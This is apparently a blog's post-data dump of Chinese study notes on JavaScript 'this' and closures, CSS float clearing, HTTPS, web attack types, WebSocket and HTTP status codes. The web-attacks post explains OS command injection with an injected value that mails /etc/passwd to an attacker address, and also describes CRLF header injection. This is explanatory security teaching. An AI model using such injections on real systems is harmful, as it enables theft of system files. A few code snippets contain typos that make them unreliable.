指向这一节将把这个例子作为 demo 进行改造。 箭头函数众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。箭头函数的 this 始终指向函数定义时的 this，而非执行时。箭头函数需要记着这句话：“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”。箭头函数的绑定无法被修改，new也不可以 例 8 ： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( () =&gt; &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry复制代码 在函数内部使用 _this = this如果不使用 ES6，那么这种方式应该是最简单的不会出错的方式了，我们是先将调用这个函数的对象保存在变量 _this 中，然后在函数中都使用这个 _this，这样 _this 就不会改变了。例 9： 1234567891011121314151617181920var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; var _this = this; setTimeout( function() &#123; _this.func1() &#125;,100); &#125;&#125;;a.func2() // Cherry复制代码 这个例子中，在 func2 中，首先设置 var _this = this;，这里的 this 是调用 func2 的对象 a，为了防止在 func2 中的 setTimeout 被 window 调用而导致的在 setTimeout 中的 this 为 window。我们将 this(指向变量 a) 赋值给一个变量 _this，这样，在 func2 中我们使用 _this 就是指向对象 a 了。 使用 apply、call、bind使用 apply、call、bind 函数也是可以改变 this 的指向的，原理稍后再讲，我们先来看一下是怎么实现的： 使用 apply例 10： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.apply(a),100); &#125;&#125;;a.func2() // Cherry复制代码 使用 call例 11： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.call(a),100); &#125;&#125;;a.func2() // Cherry复制代码 使用 bind例 12： 12345678910111213141516var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;.bind(a)(),100); &#125;&#125;;a.func2() // Cherry复制代码 apply、call、bind 区别刚刚我们已经介绍了 apply、call、bind 都是可以改变 this 的指向的，但是这三个函数稍有不同。 在 MDN 中定义 apply 如下； apply() 方法调用一个函数, 其具有一个指定的this值，以及作为一个数组（或类似数组的对象）提供的参数 语法： fun.apply(thisArg, [argsArray]) thisArg：在 fun 函数运行时指定的 this 值。需要注意的是，指定的 this 值并不一定是该函数执行时真正的 this 值，如果这个函数处于非严格模式下，则指定为 null 或 undefined 时会自动指向全局对象（浏览器中就是window对象），同时值为原始值（数字，字符串，布尔值）的 this 会指向该原始值的自动包装对象。 argsArray：一个数组或者类数组对象，其中的数组元素将作为单独的参数传给 fun 函数。如果该参数的值为null 或 undefined，则表示不需要传入任何参数。从ECMAScript 5 开始可以使用类数组对象。浏览器兼容性请参阅本文底部内容。 apply 和 call 的区别其实 apply 和 call 基本类似，他们的区别只是传入的参数不同。 call 的语法为： 1fun.call(thisArg[, arg1[, arg2[, ...]]])复制代码 所以 apply 和 call 的区别是 call 方法接受的是若干个参数列表，而 apply 接收的是一个包含多个参数的数组。 例 13： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.apply(a,[1,2]) // 3复制代码 例 14： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.call(a,1,2) // 3复制代码 bind 和 apply、call 区别我们先来将刚刚的例子使用 bind 试一下 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.bind(a,1,2)复制代码 我们会发现并没有输出，这是为什么呢，我们来看一下 MDN 上的文档说明： bind()方法创建一个新的函数, 当被调用时，将其this关键字设置为提供的值，在调用新函数时，在任何提供之前提供一个给定的参数序列。 所以我们可以看出，bind 是创建一个新的函数，我们必须要手动去调用： 123456789var a =&#123; name : &quot;Cherry&quot;, fn : function (a,b) &#123; console.log( a + b) &#125;&#125;var b = a.fn;b.bind(a,1,2)() // 3复制代码 ==================================== 更新============================== JS 中的函数调用看到留言说，很多童靴不理解为什么 例 6 的 innerFunction 和 例 7 的 this 是指向 window 的，所以我就来补充一下 JS 中的函数调用。例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 函数调用的方法一共有 4 种 作为一个函数调用 函数作为方法调用 使用构造函数调用函数 作为函数方法调用函数（call、apply） 作为一个函数调用比如上面的 例 1：例 1： 12345678910var name = &quot;windowsName&quot;;function a() &#123; var name = &quot;Cherry&quot;; console.log(this.name); // windowsName console.log(&quot;inner:&quot; + this); // inner: Window&#125;a();console.log(&quot;outer:&quot; + this) // outer: Window复制代码 这样一个最简单的函数，不属于任何一个对象，就是一个函数，这样的情况在 JavaScript 的在浏览器中的非严格模式默认是属于全局对象 window 的，在严格模式，就是 undefined。 但这是一个全局的函数，很容易产生命名冲突，所以不建议这样使用。 函数作为方法调用所以说更多的情况是将函数作为对象的方法使用。比如例 2：例 2： 12345678var name = &quot;windowsName&quot;;var a = &#123; name: &quot;Cherry&quot;, fn : function () &#123; console.log(this.name); // Cherry &#125;&#125;a.fn();复制代码 这里定义一个对象 a，对象 a 有一个属性（name）和一个方法（fn）。 然后对象 a 通过 . 方法调用了其中的 fn 方法。 然后我们一直记住的那句话“this 永远指向最后调用它的那个对象”，所以在 fn 中的 this 就是指向 a 的。 使用构造函数调用函数 如果函数调用前使用了 new 关键字, 则是调用了构造函数。这看起来就像创建了新的函数，但实际上 JavaScript 函数是重新创建的对象： 123456789// 构造函数:function myFunction(arg1, arg2) &#123; this.firstName = arg1; this.lastName = arg2;&#125;// This creates a new objectvar a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);a.lastName; // 返回 &quot;Cherry&quot;复制代码 这就有要说另一个面试经典问题：new 的过程了，(ಥ_ಥ)这里就简单的来看一下 new 的过程吧：伪代码表示： 12345678var a = new myFunction(&quot;Li&quot;,&quot;Cherry&quot;);new myFunction&#123; var obj = &#123;&#125;; obj.__proto__ = myFunction.prototype; var result = myFunction.call(obj,&quot;Li&quot;,&quot;Cherry&quot;); return typeof result === &#x27;obj&#x27;? result : obj;&#125;复制代码 创建一个空对象 obj; 将新创建的空对象的隐式原型指向其构造函数的显示原型。 使用 call 改变 this 的指向 如果无返回值或者返回一个非对象值，则将 obj 返回作为新对象；如果返回值是一个新对象的话那么直接直接返回该对象。 所以我们可以看到，在 new 的过程中，我们是使用 call 改变了 this 的指向。 作为函数方法调用函数 在 JavaScript 中, 函数是对象。 JavaScript 函数有它的属性和方法。call() 和 apply() 是预定义的函数方法。 两个方法可用于调用函数，两个方法的第一个参数必须是对象本身 在 JavaScript 严格模式(strict mode)下, 在调用函数时第一个参数会成为 this 的值， 即使该参数不是一个对象。在 JavaScript 非严格模式(non-strict mode)下, 如果第一个参数的值是 null 或 undefined, 它将使用全局对象替代。 这个时候我们再来看例 6：例 6： 1234567891011var name = &quot;windowsName&quot;;function fn() &#123; var name = &#x27;Cherry&#x27;; innerFunction(); function innerFunction() &#123; console.log(this.name); // windowsName &#125;&#125;fn()复制代码 这里的 innerFunction() 的调用是不是属于第一种调用方式：作为一个函数调用（它就是作为一个函数调用的，没有挂载在任何对象上，所以对于没有挂载在任何对象上的函数，在非严格模式下 this 就是指向 window 的） 然后再看一下 例 7：例 7： 123456789101112131415161718var name = &quot;windowsName&quot;;var a = &#123; name : &quot;Cherry&quot;, func1: function () &#123; console.log(this.name) &#125;, func2: function () &#123; setTimeout( function () &#123; this.func1() &#125;,100 ); &#125;&#125;;a.func2() // this.func1 is not a function复制代码 这个简单一点的理解可以理解为“匿名函数的 this 永远指向 window”，你可以这样想，还是那句话this 永远指向最后调用它的那个对象，那么我们就来找最后调用匿名函数的对象，这就很尴尬了，因为匿名函数名字啊，笑哭，所以我们是没有办法被其他对象调用匿名函数的。所以说 匿名函数的 this 永远指向 window。 如果这个时候你要问，那匿名函数都是怎么定义的，首先，我们通常写的匿名函数都是自执行的，就是在匿名函数后面加 () 让其自执行。其次就是虽然匿名函数不能被其他对象调用，但是可以被其他函数调用啊，比如例 7 中的 setTimeout。 转自（作者：sunshine小小倩链接：https://juejin.cn/post/6844903496253177863来源：稀土掘金）","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"理解闭包","slug":"理解闭包","date":"2022-04-13T06:15:41.000Z","updated":"2022-08-18T16:01:44.597Z","comments":true,"path":"2022/04/13/理解闭包/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E7%90%86%E8%A7%A3%E9%97%AD%E5%8C%85/","excerpt":"","text":"123456789function foo()&#123; var a=2; function bar()&#123; console.log(a); &#125; return bar; &#125; var baz=foo(); baz();//2 内部函数bar()能够访问foo()的内部作用域，将bar()函数本身作为值类型传递，调用foo()，我们通常希望整个内部作用域被销毁，然而因为bar()所声明的位置拥有涵盖foo()内部作用域的闭包，使得作用域一直存活，以供bar()在任何时间之后进行引用。内部函数依然持有对外部函数的作用域的引用，这个引用就叫做闭包 总结来说：本质就是上级作用域内变量的生命周期，因为被下级作用域内引用，而没有被释放。就导致上级作用域内的变量，等到下级作用域执行完以后才正常得到释放。 闭包的作用：封装变量闭包可以把一些不需要暴露在全局的变量封装成“私有变量”，如果一个大函数中有一些代码块能独立出来，我们常常把这些代码块封装在一个独立的小函数里面，独立出来的小函数有助于代码复用，如果这些小函数不需要在程序的其他地方使用，可以用闭包封闭起来 12345678910111213141516var mult = (function()&#123; vat cache = &#123;&#125; var calculate = function()&#123; var a=1 for(var i=0,l=arguments.length;i&lt;l;i++)&#123; a = a*arguments[i] &#125; &#125; return function()&#123; var args = Array.prototype.join.call(arguments,&#x27;,&#x27;) if(args in cache)&#123; return cache[args] &#125; return cache[args] = calculate.apply(null,arguments) &#125;&#125;)() 延长局部变量寿命12345var report = function(src)&#123; var img = new Image() img.src = src&#125;report(&quot;http://xxx.com/getUserInfo&quot;) 如果report函数调用结束后，img局部变量立即被销毁，如果还没来得及发起HTTP请求，此次起笔趣就会丢失掉 用闭包延长Img寿命 123456789var report = (function()&#123; var imgs = [] return function(src)&#123; var img = new Image() imgs.push(img) img.src = src &#125; &#125;)() 闭包和面向对象设计对象以方法的形式包含了过程，而闭包则是在过程中以环境的形式包含了数据，通常面向对象的思想能实现的功能闭包也能实现： 12345678910var extent = function()&#123; var value = 0; return &#123; call:function()&#123; value++; console.log(value); &#125; &#125;&#125;var extent = extent() 用面向对象的思想： 12345678var extent = &#123; value:0, call: function()&#123; thie.value++; console.log(this.value) &#125; &#125; 用闭包实现命令模式12345678910111213141516171819202122232425262728293031var TV = &#123; open: function()&#123; console.log(&#x27;open&#x27;) &#125; , close: function()&#123; console.log(&#x27;close&#x27;) &#125;&#125;var createCommand = function(receiver)&#123; var excute = function()&#123; return receiver.open() &#125; var undo = function()&#123; return receiver.close() &#125; return &#123; excute:excute, undo: undo &#125;&#125;var setCommand = function(command)&#123; document.getElementById(&#x27;excute&#x27;).onclick = function()&#123; command.excute()//open &#125; document.getElementById(&#x27;undo&#x27;).onclick = function()&#123; command.undo()//close &#125;&#125;setCommand(createCommand(Tv)) TV即命令接收者，往函数对象中预先植入命令接收者，命令接收者被封闭在闭包形成的环境中 闭包与内存管理：使用闭包的时候容易造成循环引用，但这并非闭包的问题，浏览器的采用引用计数的垃圾回收策略，如果两个对象发生了循环引用，那么这两个对象肯都无法被回收，但是循环引用造成内存泄漏本质上也不是闭包的原因，这时需要把循环引用的变量中的其中一个设为null","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"CSS画三角","slug":"CSS画三角","date":"2022-04-13T03:36:52.000Z","updated":"2022-05-29T07:48:00.823Z","comments":true,"path":"2022/04/13/CSS画三角/","link":"","permalink":"https://coloey.github.io/2022/04/13/CSS%E7%94%BB%E4%B8%89%E8%A7%92/","excerpt":"","text":"1234567891011div &#123; width:0; height:0; border: 10px solid transparent; border-left-color:pink; /*照顾兼容性*/ line-height:0; font-size:0; &#125; margin负值巧妙使用 12345678910111213141516171819202122232425262728&lt;style&gt; ul li &#123; list-style-type: none; float:left; width: 150px; height: 200px; border:1px solid red; margin-left: -1px; &#125; ul li:hover &#123; /* 如果盒子没有定位则添加相对定位使得合资压住所有其他标准流 */ position:relative; border: 1px solid blue; &#125; ul li :hover &#123; /* 如果盒子有定位设置z-index提高盒子层级 */ z-index:1; border: 1px solid blue; &#125; &lt;/style&gt; &lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;/ul&gt;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/tags/CSS/"},{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"}]},{"title":"清除浮动","slug":"清除浮动","date":"2022-04-13T01:36:28.000Z","updated":"2022-05-24T09:29:03.606Z","comments":true,"path":"2022/04/13/清除浮动/","link":"","permalink":"https://coloey.github.io/2022/04/13/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/","excerpt":"","text":"为什么需要清除浮动由于父级盒子很多情况下，不方便给高度，当时盒子浮动又不占有位置，最后父级盒子高度为 0 时，就会影响下面的盒子，对后面元素排版产生影响。 清除浮动本质 清除浮动的本质是清除浮动元素造成的影响 如果父盒子本身具有高度，则不需要清除浮动 清除浮动之后，父级会根据浮动的子盒子自动检测高度，父级有了高度，就不会影响下面的标准流了 语法： 123选择器: &#123; clear: 属性值;&#125; 属性值 描述 left 不允许左侧有浮动元素 right 不允许右侧有浮动元素 both 同时清除左右两侧浮动 清除浮动策略：闭合浮动 方法： 额外标签法（隔墙法），是 W3C 推荐的方法 父级添加 overflow 属性 父级添加 after 伪元素 父级添加双伪元素 额外标签法也称为隔墙法，是 W3C 推荐的方法。 额外标签法是在最后一个浮动元素末尾添加一个 空块级元素（不能是行内元素），给其赋以属性 clear:both;。 1234&lt;style&gt; clear: both;&lt;/style&gt;&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;Copy to clipboardErrorCopied 优点：通俗易懂，书写方便 缺点：添加许多无意义的标签，结构化差 总结 清除浮动的本质 清除浮动的本质是清除浮动元素脱离标准流造成的影响 清除浮动的策略 闭合浮动，只让浮动在父盒子内部影响，不影响父盒子外面的其他盒子。 使用场景 实际开发中可能会遇到，但是不常用。 父级添加 overflow 属性可以给父级添加 overflow 属性，将其属性设置为 hidden、auto或scroll。 注意是给父元素添加代码： 优点：代码简洁 缺点：无法显示溢出部分 父级添加 after 伪元素实际上也是额外标签法的一种。（相当于在最后一个子元素后面再添加一个元素隔开） 123456789101112.clearfix::after &#123; content: &quot;&quot;; display: block;//伪元素为行内块元素，要转换为块级元素 height: 0; clear: both; visibility: hidden;&#125;.clearfix &#123; /*IE6、7专有*/ *zoom: 1;&#125; 父级添加双伪元素1234567891011.clearfix::before,.clearfix::after &#123; content: &quot;&quot;;//前后都隔开 display: table;//伪元素为行内块元素，要转换为块级元素&#125;.clearfix::after &#123; clear: both;&#125;.clearfix &#123; *zoom: 1;&#125;Copy to clipboardErrorCopied 优点：代码更简洁 缺点：照顾低版本浏览器 代表网站：小米、腾讯 伪元素转化为块级元素原因：根本原因是为了解决clearfix内部非浮动元素margin塌陷问题。 另发现一个新属性display: flow-root，不支持Safari。它可以创建无副作用的BFC。在父级块中使用 display: flow-root 可以创建新的BFC。其作用和clearfix一致。 参考： 为什么需要清除浮动？ 父级没高度 子盒子浮动了 影响下面布局了，应该清除浮动。","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"HTTPS","slug":"HTTPS","date":"2022-04-12T14:02:46.000Z","updated":"2022-05-07T13:14:10.370Z","comments":true,"path":"2022/04/12/HTTPS/","link":"","permalink":"https://coloey.github.io/2022/04/12/HTTPS/","excerpt":"","text":"HTTP+加密+认证+完整性保护=HTTPSHTTPS是HTTP通信接口部分用SSL和TLS协议代替。 SSL是独立于HTTP的协议 相互交换密钥的公开密钥加密技术共享密钥加密加密和解密用一个密钥的方式，也叫做对称密钥加密 使用两把密钥的公开密钥加密使用非对称的密钥，一把叫做私有密钥，另一把叫做公有密钥，私有密钥不能让任何人知道，公有密钥可以随意发布。 发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密，解密过程是队离散对数的求值。 HTTPS采用混合加密机制 证明公开密钥正确性的证书 HTTPS的安全通信机制 客户端通过发送Client Hello报文开始SSL通信，报文中包含客户端支持的SSL的指定版本，加密组件列表 服务器可进行SSL通信时，会以Server Hello报文作为应答，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的 之后服务器发送Certificate报文，报文中包含公开密钥证书 最后服务器发送Server Hello Done 报告通知客户端，最初阶段的SSL握手协商部分结束 SSL第一次握手结束后，客户端以Client Key Exchange报文作为回应，报文中包含通信加密中使用的一种被称为Pre-master secret的随机密码串，该报文已用步骤3中的公开密钥进行加密 接着客户端继续发送Change Cipher Spec报文，该报文会提示服务器，在此报文之后的通信会采用Pre-master secret密钥加密 客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否正确解密该报文作为判定标准 服务器同样发送Change Cipher Spec报文 服务器同样发送Finished报文 服务端和客户端的Finished报文交换完毕后，SSL连接就建立完成。通信会受到SSL保护，从此开始进行应用层协议通信，即发送HTTP请求 SSL缺点： 通信慢 大量消耗CPU及内存资源，导致处理速度慢","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"}],"tags":[]},{"title":"针对Web的攻击技术","slug":"针对Web的攻击技术","date":"2022-04-12T10:09:24.000Z","updated":"2022-08-22T16:01:12.918Z","comments":true,"path":"2022/04/12/针对Web的攻击技术/","link":"","permalink":"https://coloey.github.io/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","excerpt":"","text":"针对Web应用的攻击模式 主动攻击 被动攻击 以服务器为目标的主动攻击指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击 以服务器为目标的被动攻击被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击 跨站脚本攻击（XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击 跨站脚本攻击可能造成的影响 利用虚假输入的表单骗取用户个人信息 利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求 显示伪造的文章或图片 eg: 在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入： 对用户Cookie的窃取 SQL注入攻击会执行非法SQL的SQL注入攻击 造成影响： 非法查看或篡改数据库内的数据 规避认证 执行和数据库服务业务关联的程序等 eg: 某购物网站可将坐着名字作为搜索关键字查找他的所有著作 结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示 OS命令注入攻击指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。 可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。 eg: 咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。 123my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);print MAIL &quot;FROM :info@example.com\\n&quot;; 程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址 1;cat /etc/passwd |mail hack@example.jp 程序接收到该值后构成以下组合： 1open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp “;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给&#104;&#x61;&#99;&#107;&#x40;&#101;&#120;&#97;&#x6d;&#112;&#x6c;&#101;&#x2e;&#x6a;&#112;。 HTTP首部注入攻击值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。 HTTP首部注入攻击有可能会造成以下影响： 设置任何Cookie信息 重定向至任意URL 显示任意的主体（HTTP响应阶段攻击） 此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户 攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。 HTTP响应截断攻击HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。 利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果 邮件首部注入攻击攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。邮件地址：%0D%0A 代表一个换行符，可以实现邮件地址的追加 %0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容 目录遍历攻击：对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击用户可使用．…/等相对路径定位到/etc/passed等绝对路径上例： 远程文件包含漏洞当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。例： 开放重定向是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板 因会话管理疏忽引发漏洞会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。 会话 会话固定攻击对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID 例子： 跨站点请求伪造（CSRF）是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。 可能造成的影响： 利用已通过认证的用户权限更新设定信息等 利用已通过认证的用户权限购买商品 利用已通过认证的用户权限在留言板发表言论 例子： DOS攻击是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。 主要有两种DOS攻击方式： 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。 通过攻击安全漏洞使服务停止 集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。 多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"HTTP","slug":"计算机网络/HTTP","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/"}],"tags":[]},{"title":"WebSocket","slug":"WebSocket","date":"2022-04-12T09:46:11.000Z","updated":"2022-08-25T02:06:46.473Z","comments":true,"path":"2022/04/12/WebSocket/","link":"","permalink":"https://coloey.github.io/2022/04/12/WebSocket/","excerpt":"","text":"初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？ 答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。 举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。 这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用“轮询”：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。 轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。 使用浏览器进行全双工通信的WebSocketWebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。 它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。 其他特点包括： （1）建立在 TCP 协议之上，服务器端的实现比较容易。 （2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。 （3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。 （4）可以发送文本，也可以发送二进制数据。 （5）没有同源限制，客户端可以与任意服务器通信。 （6）协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。 1ws://example.com:80/some/path 握手请求1Upgrade:websocket Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称 握手响应对于之前的请求，返回状态码101 Switching Protocols的响应","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://coloey.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"返回结果的http状态码","slug":"返回结果的http状态码","date":"2022-04-11T11:58:12.000Z","updated":"2022-04-11T13:30:34.582Z","comments":true,"path":"2022/04/11/返回结果的http状态码/","link":"","permalink":"https://coloey.github.io/2022/04/11/%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81/","excerpt":"","text":"状态码作用：状态码的职责是当客户端向服务器发送请求时，描述返回的请求结果，借助状态码，用户可以知道服务器时正常处理了请求，还是出现了错误。 状态码类别： 类别 原因短语 1xx Informational(信息状态码) 接收的请求正在处理 2xx Success(成功状态码) 请求正常处理完毕 3xx Redirection(重定向状态码) 需要进行附加操作以完成请求 4xx Client Error(客户端错误状态码) 服务器无法处理请求 5xx Server Error(服务器错误状态码) 服务器处理请求出错 2xx成功200 OK表示从客户端发来的请求在服务器端被正常处理了 在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用Get方法，对应请求支援的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体首部不随报文实体作为响应返回。（即在响应中只返回首部，不返回实体主体部分） 204 No Content该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，不允许返回任何实体的主体。比如，当从浏览器中发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新。 一般在只需要从客户端往服务器发送消息，而对客户端不需要发送新消息内容的情况下使用 206 Partial Content该状态码表示客户端进行范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容 3xx重定向3xx响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 301 Moved Permanently永久性重定向。该状态码表示请求的资源已被分配了新的URI，以后应该使用资源现在所指的URI，也就是说，如果已经把资源对应的URI保存为书签，这时应该按Location首部字段提示的URI重新保存。 eg: http://example.com/sample 当指定资源路径的最后忘记添加“/“，就会产生301状态码 302 Found临时性重定向，该状态码表示请求的资源已被分配了新的URI，希望用户（本次）能使用新的URI访问。和301 Moved Permanently状态码相似，但302状态码代表的资源不是被永久移动，只是临时性质。换句话说，已移动的资源对应的URI将来还有可能发生改变。用户把URI保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回的302状态码的页面对应的URI。 303 See Other该状态码表示由于请求对应的资源存在着另一个URI，应使用GET方法定向获取请求的资源。303状态码和302Found状态码有着相同功能。但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别。比如，当使用POST方法访问CGI程序，其执行后的处理结果是希望客户端能以GET方法重定向到另一个URI上去时，返回303状态码。 当301,302,303返回响应码时，几乎所有浏览器都会把POST改为GET，并删除请求报文的主体，之后请求会自动再次发送。 